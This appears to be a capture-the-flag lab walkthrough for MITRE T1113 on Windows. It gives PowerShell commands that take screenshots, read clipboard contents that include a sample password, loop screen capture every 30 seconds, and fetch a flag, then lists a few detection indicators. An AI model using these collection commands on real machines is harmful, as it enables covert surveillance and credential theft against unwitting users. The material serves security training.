# T1113 – Screen Capture | Solution Walkthrough
**Difficulty:** Easy | **OS:** Windows | **MITRE:** T1113

## Step 1 – Take Screenshot via PowerShell
```powershell
powershell -File C:\ProgramData\capture_screen.ps1
# [+] Screenshot saved: C:\Users\Public\screenshot_20240101_120000.png
```

## Step 2 – Alternative: PrintScreen via SendKeys
```powershell
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('%{PRTSC}')
Start-Sleep 1
$clip = [System.Windows.Forms.Clipboard]::GetImage()
$clip.Save("C:\Users\Public\screen_via_sendkeys.png")
```

## Step 3 – Clipboard Capture (T1115)
```powershell
Set-Clipboard "Sensitive password: Admin@Corp123"
powershell -File C:\ProgramData\capture_clipboard.ps1
Get-Content "C:\Users\Public\clipboard_capture.txt"
# Sensitive password: Admin@Corp123
```

## Step 4 – Continuous Screen Monitoring
```powershell
# Take screenshot every 30 seconds:
while ($true) {
    & "C:\ProgramData\capture_screen.ps1"
    Start-Sleep 30
}
```

## Retrieve Flag
```powershell
Get-Content "C:\Windows\System32\flag_T1113.txt"
# HACKTIFY{SCREEN_CAPTURE_<hostname>}
```

## Detection
- Monitor for `System.Drawing` + `CopyFromScreen` usage in PowerShell logs
- Alert on unusual image file creation in temp directories
- Screen capture APIs: `BitBlt`, `CopyFromScreen`, `SnapshotDesktop`
